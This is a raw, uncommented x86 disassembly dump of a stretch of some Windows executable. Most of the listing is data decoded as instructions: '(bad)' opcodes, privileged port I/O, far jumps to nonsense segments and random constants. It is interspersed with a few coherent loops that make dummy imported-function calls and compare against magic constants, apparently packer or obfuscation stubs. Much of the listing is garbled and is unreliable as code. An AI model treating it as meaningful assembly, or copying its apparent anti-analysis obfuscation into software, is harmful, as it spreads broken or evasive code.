  40514a:	sub    BYTE PTR [edx+0x6b],bl
  40514d:	mov    al,fs:0xc28a2037
  405153:	pop    edx
  405154:	in     eax,0x4d
  405156:	in     eax,dx
  405157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405158:	push   0x915284d
  40515d:	dec    edi
  40515e:	jae    0x405191
  405160:	stos   BYTE PTR es:[edi],al
  405161:	mov    ebp,0x4b364e8b
  405166:	xchg   ecx,eax
  405167:	ins    DWORD PTR es:[edi],dx
  405168:	cli    
  405169:	mov    ah,0x90
  40516b:	dec    edx
  40516c:	mov    ds:0xb4a2850f,al
  405171:	out    dx,al
  405172:	adc    DWORD PTR [esi],0x1a708eed
  405178:	xlat   BYTE PTR ds:[ebx]
  405179:	stc    
  40517a:	ret    
  40517b:	mov    ebp,0x4fa3cb10
  405180:	sbb    dl,BYTE PTR [ebx-0x5f]
  405183:	loopne 0x4051ec
  405185:	ins    BYTE PTR es:[edi],dx
  405186:	xlat   BYTE PTR ds:[ebx]
  405187:	fimul  DWORD PTR [edx-0x183dbf95]
  40518d:	inc    esp
  40518e:	cli    
  40518f:	(bad)
  405194:	jbe    0x40511e
  405196:	outs   dx,BYTE PTR ds:[esi]
  405197:	outs   dx,BYTE PTR ds:[esi]
  405198:	xchg   ebx,eax
  405199:	jns    0x405167
  40519b:	ins    DWORD PTR es:[edi],dx
  40519c:	out    dx,al
  40519d:	std    
  40519e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40519f:	adc    edx,edx
  4051a1:	test   DWORD PTR [edx],edx
  4051a3:	jmp    0x4051bb
  4051a5:	(bad)  
  4051a6:	cmp    DWORD PTR [esi-0x13],ebx
  4051a9:	gs js  0x4051b2
  4051ac:	in     eax,0x20
  4051ae:	dec    edx
  4051af:	repz test eax,0x790c5919
  4051b5:	mov    ds,WORD PTR [edx+0x22eea53b]
  4051bb:	push   ss
  4051bc:	idiv   DWORD PTR [edi]
  4051be:	push   0xa63ddc49
  4051c3:	gs pop es
  4051c5:	das    
  4051c6:	xor    eax,0x15e34037
  4051cb:	jmp    0xf3ae:0xe4575cc8
  4051d2:	inc    edi
  4051d3:	xor    ah,bh
  4051d5:	push   ss
  4051d6:	add    DWORD PTR [ecx+0x20],edx
  4051d9:	xor    ah,ch
  4051db:	test   BYTE PTR [ecx-0x6d0f5b8f],bl
  4051e1:	cmp    BYTE PTR ds:0x9e6b2b20,0xe6
  4051e8:	mov    eax,DWORD PTR [edx+0x19]
  4051eb:	inc    ebp
  4051ec:	sub    eax,0x657f955c
  4051f1:	and    eax,0xb8ffa0ad
  4051f6:	jbe    0x4051a9
  4051f8:	push   esp
  4051f9:	(bad)  
  4051fa:	paddsb mm7,QWORD PTR [ebx]
  4051fd:	cs push esi
  4051ff:	push   eax
  405200:	xchg   edi,eax
  405201:	(bad)  
  405202:	das    
  405203:	sahf   
  405204:	out    0x5e,al
  405206:	add    eax,0xa0324464
  40520b:	aaa    
  40520c:	jp     0x4051d5
  40520e:	fadd   DWORD PTR [ebp-0x13b539a5]
  405214:	das    
  405215:	sub    DWORD PTR [edx+0x4dcd5454],ebx
  40521b:	push   esi
  40521c:	and    al,BYTE PTR [ebp+0x129e10a0]
  405222:	idiv   ah
  405224:	retf   0x67ed
  405227:	bound  ebp,QWORD PTR [eax+0x76]
  40522a:	push   ds
  40522b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40522c:	ja     0x405231
  40522e:	or     al,0xff
  405230:	mov    bl,0x96
  405232:	cld    
  405233:	xor    eax,0xf182faf7
  405238:	fsubr  QWORD PTR [ecx+0x3640aa79]
  40523e:	test   DWORD PTR ds:[edi+0x7],edi
  405242:	call   0xc9b48d97
  405247:	mov    edx,0xee070e9f
  40524c:	bound  esp,QWORD PTR [eax-0x43174329]
  405252:	lea    edx,[ebp-0xbfe8f67]
  405258:	sbb    esp,DWORD PTR [edi+0x61aae936]
  40525e:	cmp    ebx,DWORD PTR [ebx]
  405260:	pop    ebx
  405261:	add    BYTE PTR [eax],ah
  405263:	cmc    
  405264:	outs   dx,BYTE PTR ds:[esi]
  405265:	xchg   ecx,eax
  405266:	ficomp DWORD PTR ds:0x314eb11
  40526c:	xchg   edx,eax
  40526d:	lods   eax,DWORD PTR ds:[esi]
  40526e:	bound  ecx,QWORD PTR [eax-0x44f9c06e]
  405274:	nop
  405275:	adc    BYTE PTR [ecx],al
  405277:	mov    ch,0xbc
  405279:	adc    BYTE PTR [eax],dh
  40527b:	lock jmp 0x9bc8:0x4bde7d72
  405283:	sbb    BYTE PTR [esi+0x57],bl
  405286:	daa    
  405287:	fidiv  WORD PTR [ecx+0x54efb43]
  40528d:	inc    edi
  40528e:	mov    eax,0x57a39f76
  405293:	or     eax,0xf45387c1
  405298:	outs   dx,DWORD PTR ds:[esi]
  405299:	call   0xc3ff:0x83c15118
  4052a0:	cmp    ebx,DWORD PTR [esi+0x31f24708]
  4052a6:	imul   edx,edi
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4305a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4305a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4305a6,eax
  405305:	cmp    DWORD PTR ds:0x4305a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4305a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eba8
  40533f:	cmp    DWORD PTR ds:0x4305a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4305a6
  405351:	inc    eax
  405352:	mov    ds:0x4305a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4305da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43066a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4305c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4305b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4305a6
  40538a:	add    DWORD PTR ds:0x42e872,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4305be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4305be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4305be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4305be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eca0
  4053c9:	cmp    DWORD PTR ds:0x4305be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ef14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ef14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ef14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ef14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42eae4
  405405:	cmp    DWORD PTR ds:0x42ef14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ef14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ef14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ef14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x20531109
  405456:	pushf  
  405457:	shl    BYTE PTR [esi+edi*2],cl
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x40541d
  405460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405461:	or     BYTE PTR [ebp-0x31007a44],al
  405467:	mov    ebp,0x5fe6007a
  40546c:	pop    edx
  40546d:	out    0x2d,eax
  40546f:	outs   dx,DWORD PTR ds:[esi]
  405470:	mov    esi,0x883e430c
  405475:	inc    edi
  405476:	inc    ecx
  405477:	mov    eax,0x94ac142f
  40547c:	push   ss
  40547d:	xor    al,0xc3
  40547f:	xchg   DWORD PTR [eax-0x46e2b8aa],esp
  405485:	mov    BYTE PTR [edi-0x425775c7],dl
  40548b:	and    ebp,edx
  40548d:	sbb    BYTE PTR [ecx],bl
  40548f:	cmp    DWORD PTR [ebp+0x53],ebp
  405492:	(bad)  
  405493:	jecxz  0x4054ba
  405495:	in     eax,dx
  405496:	out    0xca,al
  405498:	fiadd  DWORD PTR [edi]
  40549a:	inc    esp
  40549b:	mov    dl,BYTE PTR [eax+0x4a75faf3]
  4054a1:	mov    cl,0xd7
  4054a3:	ds test eax,0x1ba95a6b
  4054a9:	sub    esp,DWORD PTR [eax+0x70]
  4054ac:	xchg   edi,eax
  4054ad:	scas   eax,DWORD PTR es:[edi]
  4054ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054af:	or     ebp,DWORD PTR [ebx-0x5c]
  4054b2:	fcomp  QWORD PTR [ebx]
  4054b4:	mov    ds:0xb5aa384e,eax
  4054b9:	scas   eax,DWORD PTR es:[edi]
  4054ba:	lods   al,BYTE PTR ds:[esi]
  4054bb:	inc    edx
  4054bc:	mov    edi,0xe6de2286
  4054c1:	stos   BYTE PTR es:[edi],al
  4054c2:	cdq    
  4054c3:	cli    
  4054c4:	jno    0x405448
  4054c6:	cld    
  4054c7:	aas    
  4054c8:	push   esi
  4054c9:	in     eax,dx
  4054ca:	neg    al
  4054cc:	in     eax,dx
  4054cd:	leave  
  4054ce:	push   ebp
  4054cf:	lods   al,BYTE PTR ds:[esi]
  4054d0:	inc    ecx
  4054d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054d2:	ret    
  4054d3:	mov    bl,0xaf
  4054d5:	(bad)  
  4054d6:	stc    
  4054d7:	dec    ebx
  4054d8:	std    
  4054d9:	outs   dx,DWORD PTR ds:[esi]
  4054da:	loope  0x405477
  4054dc:	pop    edi
  4054dd:	adc    BYTE PTR ds:[esi-0x6d619d46],bl
  4054e4:	jb     0x405495
  4054e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054e7:	aaa    
  4054e8:	and    DWORD PTR [eax-0xf],esp
  4054eb:	fidiv  WORD PTR [edx-0x51a2c1bb]
  4054f1:	rol    BYTE PTR [eax+0x44288cfc],cl
  4054f7:	adc    DWORD PTR [eax],ebx
  4054f9:	mov    al,0xdd
  4054fb:	dec    ebx
  4054fc:	dec    ecx
  4054fd:	fucomi st,st(6)
  4054ff:	mov    ds:0xb39d4590,eax
  405504:	and    al,BYTE PTR [ebp+0x4ddf75be]
  40550a:	push   edi
  40550b:	addr16 inc edi
  40550d:	out    dx,al
  40550e:	mov    ah,0xc6
  405510:	mov    ah,0xa6
  405512:	or     bl,0x5c
  405515:	inc    edi
  405516:	cmc    
  405517:	adc    al,0xb7
  405519:	jecxz  0x405505
  40551b:	sbb    BYTE PTR [esi],ah
  40551d:	or     eax,0xcf0b5e8e
  405522:	popa   
  405523:	popa   
  405524:	sub    ecx,esi
  405526:	push   0x44
  405528:	mov    eax,ds:0x94dd23ac
  40552d:	ja     0x40556d
  40552f:	xchg   edx,eax
  405530:	jae    0x4054f2
  405532:	push   esp
  405533:	jae    0x40551e
  405535:	fwait
  405536:	aas    
  405537:	xchg   ebp,eax
  405538:	dec    eax
  405539:	shr    edi,1
  40553b:	pop    ds
  40553c:	jb     0x405589
  40553e:	inc    eax
  40553f:	inc    edx
  405540:	dec    ebp
  405541:	outs   dx,BYTE PTR ds:[esi]
  405542:	mov    ebp,0x82108f01
  405547:	jl     0x4055b0
  405549:	mov    cl,BYTE PTR [esi]
  40554b:	iret   
  40554c:	dec    esi
  40554d:	jne    0x405595
  40554f:	in     al,dx
  405550:	jns    0x405563
  405552:	shl    DWORD PTR [eax+0x721c2770],cl
  405558:	fisubr DWORD PTR ds:0xf1bf4a5e
  40555e:	xchg   edi,eax
  40555f:	imul   ecx,DWORD PTR [eax],0xffffffa2
  405562:	jns    0x4054e8
  405564:	std    
  405565:	cmp    ecx,DWORD PTR [ecx]
  405567:	es (bad) 
  405569:	sbb    BYTE PTR [ebp-0x3eab5d1b],bl
  40556f:	adc    eax,0xc9acfb34
  405574:	jb     0x4055b8
  405576:	pop    ebp
  405577:	mov    ebx,0x97dc6dee
  40557c:	outs   dx,DWORD PTR ds:[esi]
  40557d:	fild   WORD PTR [ecx]
  40557f:	and    eax,0x60f787f9
  405584:	jno    0x40550c
  405586:	mov    esp,0x3341bc3b
  40558b:	shl    dl,1
  40558d:	leave  
  40558e:	add    DWORD PTR [ebx+0x32],esp
  405591:	pop    edi
  405592:	pop    cx
  405594:	or     BYTE PTR [esi],al
  405596:	ja     0x4055bb
  405598:	mul    DWORD PTR [ecx]
  40559a:	pop    edx
  40559b:	into   
  40559c:	(bad)  
  40559d:	(bad)  
  40559f:	lock repnz xor ah,BYTE PTR [ecx]
  4055a3:	mov    ch,0x61
  4055a5:	mov    BYTE PTR [edi+0x380d31fb],cl
  4055ab:	data16 adc ch,ch
  4055ae:	adc    esp,DWORD PTR [esp+ebx*8]
  4055b1:	cs loopne 0x405546
  4055b4:	in     eax,dx
  4055b5:	retf   
  4055b6:	jb     0x4055a6
  4055b8:	stc    
  4055b9:	test   DWORD PTR [ebp+0x56d28e5c],ebx
  4055bf:	xchg   ebp,eax
  4055c0:	add    dh,BYTE PTR [edi]
  4055c2:	addr16 pop ecx
  4055c4:	imul   edx
  4055c6:	mov    cl,bl
  4055c8:	mov    WORD PTR [ebx],gs
  4055ca:	es sti 
  4055cc:	mov    edx,0x918b1bb6
  4055d1:	ss test al,0x1d
  4055d4:	xchg   dl,cl
  4055d6:	pop    ecx
  4055d7:	and    bh,dh
  4055d9:	sbb    eax,0x159fa186
  4055de:	pop    edx
  4055df:	xchg   ebx,eax
  4055e0:	xchg   ebp,eax
  4055e1:	mov    esp,0x7dbfc71
  4055e6:	les    eax,FWORD PTR [edx]
  4055e8:	push   cs
  4055e9:	popa   
  4055ea:	add    edi,eax
  4055ec:	(bad)  
  4055ed:	out    0xfe,eax
  4055ef:	pop    es
  4055f0:	(bad)  
  4055f1:	xchg   ecx,eax
  4055f2:	stc    
  4055f3:	push   ds
  4055f4:	xchg   edx,eax
  4055f5:	imul   esi,DWORD PTR [ebx+0x2d832edd],0x2c516cce
  4055ff:	jno    0x405654
  405601:	and    al,0xac
  405603:	dec    esp
  405604:	and    dh,BYTE PTR [esp+eiz*2+0x191e8dd]
  40560b:	push   eax
  40560c:	stc    
  40560d:	xor    DWORD PTR [edi+0x2629415a],edx
  405613:	xor    DWORD PTR [ebp+eax*8+0x33],ebx
  405617:	xchg   BYTE PTR ds:0xf8affb17,bh
  40561d:	clc    
  40561e:	clc    
  40561f:	repz xor eax,DWORD PTR [eax]
  405622:	sbb    edi,edi
  405624:	scas   eax,DWORD PTR es:[edi]
  405625:	ds stos BYTE PTR es:[edi],al
  405627:	aad    0xbb
  405629:	jae    0x405670
  40562b:	scas   eax,DWORD PTR es:[edi]
  40562c:	shl    BYTE PTR [edi],cl
  40562e:	call   0x5bb1e61e
  405633:	ret    
  405634:	sub    al,0xac
  405636:	xchg   BYTE PTR [eax],al
  405638:	icebp  
  405639:	cmp    eax,0xe10206be
  40563e:	xchg   BYTE PTR [eax],al
  405640:	repnz cwde 
  405642:	push   ds
  405643:	and    BYTE PTR [esi],cl
  405645:	(bad)
  405648:	(bad)  
  405649:	sub    al,0x57
  40564b:	iret   
  40564c:	xchg   edx,eax
  40564d:	push   0x66
  40564f:	loopne 0x405640
  405651:	mov    dl,0x86
  405653:	xchg   edi,eax
  405654:	sbb    DWORD PTR [edi+0x33],ebx
  405657:	into   
  405658:	mov    BYTE PTR fs:[esp+eax*4+0x514ea252],bl
  405660:	xor    DWORD PTR [ebx],edi
  405662:	out    0x96,al
  405664:	xchg   ecx,eax
  405665:	out    0x11,eax
  405667:	push   DWORD PTR [eax]
  405669:	mov    ebp,0x9c2805f6
  40566e:	xchg   esp,eax
  40566f:	(bad)  
  405670:	cmp    dl,BYTE PTR [edi]
  405672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405673:	jp     0x405676
  405675:	cli    
  405676:	and    DWORD PTR [edx-0x2d73417c],eax
  40567c:	sbb    cl,BYTE PTR [edi]
  40567e:	push   ebp
  40567f:	xchg   esi,eax
  405680:	pusha  
  405681:	stos   DWORD PTR es:[edi],eax
  405682:	jge    0x405684
  405684:	and    DWORD PTR [ebp+0x2678b62d],esp
  40568a:	dec    eax
  40568b:	adc    eax,0xffffff98
  40568e:	push   ebx
  40568f:	daa    
  405690:	dec    dl
  405692:	jmp    0xaee3:0x7606ea0
  405699:	inc    eax
  40569a:	lods   eax,DWORD PTR ds:[esi]
  40569b:	add    cl,BYTE PTR [ebx-0x550df5ee]
  4056a1:	fnstsw WORD PTR [esi-0x3b3dae68]
  4056a7:	dec    ebx
  4056a8:	push   ss
  4056a9:	push   ebp
  4056aa:	or     eax,0x64d223d
  4056af:	cs pop edi
  4056b1:	js     0x4056a1
  4056b3:	xchg   ecx,eax
  4056b4:	jl     0x4056ce
  4056b6:	xchg   edi,eax
  4056b7:	xor    esi,DWORD PTR [eax-0x74ee8150]
  4056bd:	adc    ch,al
  4056bf:	jp     0x4056b1
  4056c1:	xor    al,0x79
  4056c3:	daa    
  4056c4:	and    ebx,DWORD PTR [ecx]
  4056c6:	pusha  
  4056c7:	cmp    BYTE PTR [esi-0x8],dh
  4056ca:	mov    bl,0x47
  4056cc:	loopne 0x40566f
  4056ce:	enter  0xd230,0x65
  4056d2:	mov    ds:0xb5cf6b0,eax
  4056d7:	test   BYTE PTR [esi+eiz*4+0x702d9c34],ch
  4056de:	setl   BYTE PTR [ecx+ebx*1]
  4056e2:	mov    al,0x87
  4056e4:	jmp    0xbe71:0x1c85048b
  4056eb:	(bad)  
  4056ec:	pop    ecx
  4056ed:	out    dx,al
  4056ee:	fsubr  QWORD PTR [ecx+0x3d21f42c]
  4056f4:	sbb    BYTE PTR [ebx+eiz*8-0x2fa6b253],cl
  4056fb:	movlps QWORD PTR [ebp+0x22b02d27],xmm4
  405702:	shl    bl,0x6
  405705:	dec    ecx
  405706:	and    dl,BYTE PTR [eax]
  405708:	xlat   BYTE PTR ds:[ebx]
  405709:	fs push ecx
  40570b:	push   0xffffffd2
  40570d:	sbb    cl,BYTE PTR [ebx+0x21788f09]
  405713:	repz jae 0x4056a4
  405716:	fwait
  405717:	ret    0x5dfb
  40571a:	jb     0x40569c
  40571c:	aad    0x5b
  40571e:	loope  0x40578c
  405720:	int3   
  405721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405722:	mov    edx,0x85dadb83
  405727:	mov    eax,0xee8c08fc
  40572c:	inc    edx
  40572d:	ret    
  40572e:	lahf   
  40572f:	mov    esp,DWORD PTR [esi]
  405731:	xlat   BYTE PTR ds:[ebx]
  405732:	mov    edx,0xa18112f3
  405737:	sub    BYTE PTR [edx+0x18],bh
  40573a:	(bad)  
  40573b:	call   0xb5ee11f6
  405740:	cmp    al,BYTE PTR [esi+0x258142b5]
  405746:	add    dl,BYTE PTR [ecx+0x717942e1]
  40574c:	pop    eax
  40574d:	mov    ebx,0x845a363d
  405752:	xor    eax,0x6e180813
  405757:	pop    ebx
  405758:	push   edx
  405759:	xor    edi,eax
  40575b:	and    bl,dh
  40575d:	fscale 
  40575f:	into   
  405760:	cwde   
  405761:	and    cl,0xf2
  405764:	jns    0x405739
  405766:	dec    ecx
  405767:	jbe    0x4056f0
  405769:	inc    esp
  40576a:	and    cl,al
  40576c:	push   cs
  40576d:	fcmove st,st(0)
  40576f:	mov    ebx,0xf7062f4f
  405774:	aaa    
  405775:	pop    eax
  405776:	mov    ds:0x6196d46f,al
  40577b:	push   ss
  40577c:	addr16 ss pop esi
  40577f:	(bad)  
  405781:	(bad)  
  405782:	mov    esp,0x4a5d630c
  405787:	or     ecx,DWORD PTR [eax]
  405789:	jns    0x405717
  40578b:	jnp    0x4057d5
  40578d:	sti    
  40578e:	lahf   
  40578f:	jb     0x40580d
  405791:	xor    al,0xf6
  405793:	in     eax,0x48
  405795:	inc    ebx
  405796:	pop    es
  405797:	stos   BYTE PTR es:[edi],al
  405798:	adc    eax,0x4d2f60cd
  40579d:	mov    ss,ebp
  40579f:	std    
  4057a0:	mov    ebp,0x53f8f2c6
  4057a5:	jmp    0x143d:0x1352b42e
  4057ac:	jbe    0x405788
  4057ae:	(bad)  
  4057af:	or     BYTE PTR [eax],ch
  4057b1:	aad    0xc2
  4057b3:	add    dh,BYTE PTR [ecx+0x6d512414]
  4057b9:	jnp    0x4057f7
  4057bb:	inc    ebx
  4057bc:	add    edi,eax
  4057be:	push   esp
  4057bf:	and    al,0x0
  4057c1:	cmp    bh,BYTE PTR [edi]
  4057c3:	cmp    eax,0xb46aeb33
  4057c8:	in     eax,0x89
  4057ca:	loope  0x405793
  4057cc:	(bad)  [eax+0x60]
  4057cf:	aaa    
  4057d0:	cmp    eax,0x6788e8e2
  4057d5:	(bad)  
  4057d6:	xlat   BYTE PTR ds:[ebx]
  4057d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057d8:	clc    
  4057d9:	jle    0x405794
  4057db:	xor    al,0x1a
  4057dd:	(bad)  
  4057de:	hlt    
  4057df:	jbe    0x405839
  4057e1:	xchg   ebx,eax
  4057e2:	pop    ebx
  4057e3:	ficomp WORD PTR [ebx-0x33155d69]
  4057e9:	mov    edx,0x4d521f56
  4057ee:	fs cs lahf 
  4057f1:	jge    0x4057f8
  4057f3:	push   0x32fb4763
  4057f8:	lods   eax,DWORD PTR ds:[esi]
  4057f9:	mov    dh,0x9a
  4057fb:	pop    esi
  4057fc:	pop    eax
  4057fd:	push   0xffffffbc
  4057ff:	sub    eax,0x4fd26e2d
  405804:	dec    eax
  405805:	dec    edx
  405806:	fdiv   DWORD PTR [edx]
  405808:	sub    DWORD PTR [ebx*2-0x6fc8c547],ebp
  40580f:	into   
  405810:	ret    0xd764
  405813:	lahf   
  405814:	pop    edi
  405815:	xchg   ebx,eax
  405816:	jnp    0x40585d
  405818:	imul   esi,DWORD PTR [ebp+0xb45a867],0x840ffa3b
  405822:	pop    es
  405823:	or     al,0x0
  405825:	add    BYTE PTR [ebx+0x458bf855],cl
  40582b:	cld    
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8+0x2679713c],bh
  405847:	test   BYTE PTR [ecx],dl
  405849:	cmp    BYTE PTR [esi+0x7e],bh
  40584c:	mov    ebp,0x417e7e71
  405851:	xor    BYTE PTR [edx],cl
  405853:	(bad)  
  405854:	mov    edx,0x3070b173
  405859:	mov    eax,0x7dd14e45
  40585e:	push   ss
  40585f:	test   BYTE PTR [ebx+edi*8+0xf25a65],ah
  405866:	mov    al,0x93
  405868:	repnz cdq 
  40586a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40586b:	cmc    
  40586c:	popf   
  40586d:	hlt    
  40586e:	push   ebx
  40586f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405870:	inc    eax
  405871:	mov    al,0x66
  405873:	inc    eax
  405874:	js     0x405807
  405876:	ds dec edx
  405878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405879:	or     cl,cl
  40587b:	sbb    al,0xac
  40587d:	sbb    al,0x74
  40587f:	lahf   
  405880:	test   BYTE PTR [esi+0x23a30ecd],0x1a
  405887:	push   0xf1b917a9
  40588c:	push   esi
  40588d:	hlt    
  40588e:	push   edi
  40588f:	jle    0x405873
  405891:	mov    cl,0xd8
  405893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405894:	xchg   esi,eax
  405895:	xor    eax,0xd1019913
  40589a:	loop   0x40583d
  40589c:	jno    0x40589a
  40589e:	fldcw  WORD PTR [esi-0x246092e3]
  4058a4:	cld    
  4058a5:	pop    ds
  4058a6:	aas    
  4058a7:	out    dx,al
  4058a8:	add    dh,bh
  4058aa:	arpl   WORD PTR ds:0xe902f411,si
  4058b0:	rol    DWORD PTR [ebp+0x2df3d9ed],0x97
  4058b7:	and    eax,0xb86314e7
  4058bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058bd:	std    
  4058be:	xlat   BYTE PTR ds:[ebx]
  4058bf:	ret    0xfe24
  4058c2:	es leave 
  4058c4:	test   DWORD PTR [ebx-0x56],eax
  4058c7:	in     eax,dx
  4058c8:	fwait
  4058c9:	psraw  mm4,QWORD PTR [ecx+0x2f]
  4058cd:	jge    0x405888
  4058cf:	fld    TBYTE PTR [esi+ebp*8]
  4058d2:	lods   al,BYTE PTR ds:[esi]
  4058d3:	ja     0x40589c
  4058d5:	mov    eax,0xe4073b04
  4058da:	in     eax,0x17
  4058dc:	and    DWORD PTR ds:0xcd0a4dac,eax
  4058e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058e3:	sub    BYTE PTR [ebp+0x47],ch
  4058e6:	pop    esi
  4058e7:	aad    0x8e
  4058e9:	je     0x4058c8
  4058eb:	lods   al,BYTE PTR ds:[esi]
  4058ec:	sub    DWORD PTR [esi],0xc774f332
  4058f2:	xchg   ebx,eax
  4058f3:	push   0x2f
  4058f5:	out    dx,eax
  4058f6:	loopne 0x4058e0
  4058f8:	ds cmp eax,0x5016b42f
  4058fe:	inc    eax
  4058ff:	inc    ebx
  405900:	or     bh,cl
  405902:	(bad)  
  405903:	fstp   QWORD PTR [ebp-0x2a]
  405906:	or     DWORD PTR [eax+0x750e6d11],edx
  40590c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40590d:	and    eax,0x9bd82445
  405912:	ins    DWORD PTR es:[edi],dx
  405913:	leave  
  405914:	dec    esp
  405915:	(bad)  
  405916:	ds test ecx,0x51fba67f
  40591d:	inc    edi
  40591e:	mov    al,0x3
  405920:	in     al,0x4
  405922:	(bad)  
  405923:	out    dx,eax
  405924:	push   esp
  405925:	pop    esi
  405926:	push   esi
  405927:	lds    esi,FWORD PTR [edi]
  405929:	ins    BYTE PTR es:[edi],dx
  40592a:	pushf  
  40592b:	in     al,0x6e
  40592d:	es mov edi,0xde43837e
  405933:	inc    esi
  405934:	fcmovnb st,st(2)
  405936:	stc    
  405937:	mov    eax,ds:0x663cf024
  40593c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40593d:	and    bh,BYTE PTR [edx+0x9]
  405940:	ffreep st(0)
  405942:	adc    eax,0x92e6af3a
  405947:	sahf   
  405948:	retf   0x202a
  40594b:	jbe    0x4058ce
  40594d:	dec    eax
  40594e:	inc    esp
  40594f:	xor    DWORD PTR [ecx+0x7430d5c1],ebp
  405955:	mov    bl,0xd7
  405957:	ins    DWORD PTR es:[edi],dx
  405958:	stos   BYTE PTR es:[edi],al
  405959:	icebp  
  40595a:	mov    WORD PTR [esi+0xaf9e5e3],gs
  405960:	leave  
  405961:	push   ss
  405962:	adc    DWORD PTR [esi-0x4ec7128d],esp
  405968:	adc    edi,ebx
  40596a:	in     eax,0x57
  40596c:	ficom  DWORD PTR [eax-0x2b]
  40596f:	retf   
  405970:	retf   
  405971:	les    ecx,FWORD PTR [esp+edi*1-0x79]
  405975:	push   ss
  405976:	(bad)  
  405977:	out    dx,eax
  405978:	or     eax,0x824e301e
  40597d:	dec    ecx
  40597e:	outs   dx,BYTE PTR ds:[esi]
  40597f:	push   0x4ed5226
  405984:	mov    ebx,0x820f773c
  405989:	lods   eax,DWORD PTR ds:[esi]
  40598a:	jg     0x4059dd
  40598c:	lahf   
  40598d:	cmp    al,0xde
  40598f:	xchg   ebx,eax
